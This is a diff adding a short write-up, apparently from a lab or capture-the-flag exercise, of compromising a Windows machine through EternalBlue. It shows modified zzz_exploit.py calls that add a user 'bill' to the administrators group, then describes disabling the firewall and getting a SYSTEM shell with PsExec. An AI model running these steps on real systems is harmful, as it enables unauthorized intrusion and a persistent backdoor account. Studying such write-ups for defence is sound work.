@@ -59,3 +59,23 @@ Other method is create a user and create privilege to remote desktop and adminis
 
 
 https://www.exploit-db.com/exploits/42315
+
+
+
+//
+So I scanned the machine-> instantly knew eternalblue
+
+grabbed a copy of zzz_exploit.py modified the smb_pwn function to add a user in the administrator group
+
+PHP Code:
+    service_exec(conn, r'cmd /c net user bill pass /add')
+    service_exec(conn, r'cmd /c net localgroup administrators bill /add') 
+random.png
+
+Then RDP'd in and then just ran the commandprompt as Administrator
+
+Disabled firewall and enabled smb
+
+Downloaded psExec and spawned a systemshell PsExec -i -s cmd.exe.
+
+10 min
